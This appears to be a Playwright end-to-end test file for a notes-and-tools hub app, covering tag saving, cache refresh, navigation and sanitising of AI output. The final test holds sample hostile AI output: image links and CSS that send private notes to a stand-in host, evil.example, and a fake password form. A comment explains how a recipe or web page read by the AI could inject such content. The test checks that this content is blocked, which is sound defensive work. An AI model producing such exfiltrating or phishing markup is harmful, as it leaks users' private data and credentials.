// Sign-off pass: PLAN "Amendments after Nitpick's review" 1, 2 and 4, plus
// the AI-output hardening found in code review.
import { test, expect } from '../helpers/fixtures.mjs'
import { GH_TOOL } from '../helpers/recipes.mjs'
import { tid, setup, openTool, fillHello, setHash } from '../helpers/hub.mjs'

const tile = (page, id) => tid(page, 'tool-tile').and(page.locator(`[data-tool-id="${id}"]`))

test('amendment 1: edited save-tags reach the saved row (split, trimmed, lowercased, de-duplicated)', async ({ page, brain }) => {
  await setup(page, { brain: 'connect', mode: 'auto' })
  await openTool(page, 'hello-hub')
  await fillHello(page, { topic: 'Pricing' })
  await tid(page, 'run-btn').click()
  await expect(tid(page, 'result')).toBeVisible()
  await tid(page, 'save-btn').click()
  await tid(page, 'save-tags').fill('  Strategy , MBA,strategy,, Pricing ')
  await tid(page, 'save-confirm').click()
  await expect(tid(page, 'save-status')).toBeVisible()
  await expect.poll(() => brain.hubRows().length).toBe(1)
  expect(brain.hubRows()[0].metadata.hub.tags).toEqual(['strategy', 'mba', 'pricing'])
})

test('amendment 2: refresh-tools bypasses a fresh cache and picks up a newly listed plugin', async ({ page, github }) => {
  github.repo('alice', 'brain-hub', { 'gh-tool.recipe.md': GH_TOOL })
  await setup(page)
  await setHash(page, '#/settings')
  await tid(page, 'settings-repo-override').fill('alice/brain-hub')
  await tid(page, 'settings-repo-override').press('Enter')
  await tid(page, 'settings-repo-override').blur()
  await setHash(page, '#/home')
  await expect(tile(page, 'gh-tool')).toBeVisible()
  const before = github.apiCalls().length
  expect(before).toBeGreaterThan(0)

  // A normal reload inside 10 minutes uses the cache: no new API call, no new tool.
  github.repo('alice', 'brain-hub', { 'gh-tool.recipe.md': GH_TOOL, 'new-tool.recipe.md': GH_TOOL.replace('id: gh-tool', 'id: new-tool').replace('name: From GitHub', 'name: Brand New') })
  await page.reload()
  await expect(tile(page, 'gh-tool')).toBeVisible()
  expect(github.apiCalls().length).toBe(before)
  await expect(tile(page, 'new-tool')).toHaveCount(0)

  await tid(page, 'refresh-tools').click()
  await expect(tile(page, 'new-tool')).toBeVisible()
  expect(github.apiCalls().length).toBe(before + 1)
})

test('amendment 4: nav-home is reachable from tool, add and settings', async ({ page }) => {
  await setup(page)
  for (const go of [
    async () => { await openTool(page, 'hello-hub') },
    async () => { await tid(page, 'nav-add').click(); await expect(tid(page, 'screen-add')).toBeVisible() },
    async () => { await tid(page, 'nav-settings-top').click(); await expect(tid(page, 'screen-settings')).toBeVisible() },
  ]) {
    await go()
    await expect(tid(page, 'nav-home')).toBeVisible()
    await tid(page, 'nav-home').click()
    await expect(tid(page, 'screen-home')).toBeVisible()
  }
})

// Code review finding: AI output is rendered with DOMPurify's default config,
// which keeps <img src="https://…">, <form>, <input> and <style>. A recipe, or
// a web page the AI read, can make the answer embed
// ![](https://attacker/?d=<brain notes>), and the browser fetches it with no click.
test('AI output cannot make the browser load remote images or render forms', async ({ page, net }) => {
  await setup(page, { mode: 'manual' })
  await openTool(page, 'hello-hub')
  await fillHello(page)
  await tid(page, 'run-btn').click()
  await tid(page, 'answer-box').fill([
    '## Key points',
    '- See [study](https://example.com/s).',
    '![chart](https://evil.example/leak?d=private-brain-note)',
    '<img src="https://evil.example/leak2">',
    '<form action="https://evil.example/phish"><input name="password" type="password"><button>Re-enter password</button></form>',
    '<style>body{background:url(https://evil.example/leak3)}</style>',
    '## Next steps', '- x', '## Summary', 'y',
  ].join('\n'))
  await tid(page, 'use-answer').click()
  await expect(tid(page, 'result')).toBeVisible()
  const result = tid(page, 'result')
  expect(await result.locator('img[src^="http"]').count(), 'remote images in AI output').toBe(0)
  expect(await result.locator('form, input, style').count(), 'forms/inputs/styles in AI output').toBe(0)
  // Give any image load a chance to be attempted, then check nothing reached the network.
  await page.evaluate(() => new Promise((r) => requestAnimationFrame(() => setTimeout(r, 50))))
  const leaks = net.requests.filter((r) => r.url.includes('evil.example'))
  net.violations.splice(0, net.violations.length, ...net.violations.filter((v) => !v.includes('evil.example')))
  expect(leaks.map((r) => r.url)).toEqual([])
})
